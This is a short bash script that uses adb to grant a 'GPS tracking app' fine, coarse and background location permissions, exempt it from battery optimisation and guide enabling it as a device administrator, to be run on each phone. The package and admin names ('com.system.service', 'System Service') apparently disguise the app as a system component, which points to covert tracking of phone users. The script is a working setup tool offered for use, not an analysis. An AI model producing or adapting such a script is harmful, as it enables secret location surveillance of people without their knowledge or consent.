#!/bin/bash

# This script grants all required permissions to the GPS tracking app
# Run this after installing the APK on each phone

echo "=== Granting Permissions to GPS Tracking App ==="
echo ""

PACKAGE="com.system.service"

# Grant location permissions
echo "Granting location permissions..."
adb shell pm grant $PACKAGE android.permission.ACCESS_FINE_LOCATION
adb shell pm grant $PACKAGE android.permission.ACCESS_COARSE_LOCATION
adb shell pm grant $PACKAGE android.permission.ACCESS_BACKGROUND_LOCATION

# Disable battery optimization
echo "Disabling battery optimization..."
adb shell dumpsys deviceidle whitelist +$PACKAGE

# Enable device admin (requires user interaction on Android 10+)
echo "Note: Device Admin must be enabled manually on Android 10+"
echo "Go to Settings > Security > Device Administrators > Enable 'System Service'"

echo ""
echo "=== Permissions Granted Successfully! ==="
echo ""
echo "The app should now work without requiring manual permission grants."
